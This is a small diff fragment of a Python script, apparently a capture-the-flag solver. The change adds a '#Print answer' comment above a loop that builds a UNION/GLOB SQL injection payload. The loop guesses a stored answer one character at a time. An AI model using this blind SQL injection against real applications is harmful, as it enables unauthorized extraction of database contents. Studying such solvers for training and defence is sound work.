@@ -27,6 +27,7 @@ for _ in w:
         w+=_.upper()
 print(w)
 
+#Print answer
 for q in range(l):
     for _ in w:
         d = {'answer':"'union select * from answers where answer glob '{}*'--".format(a+_)}
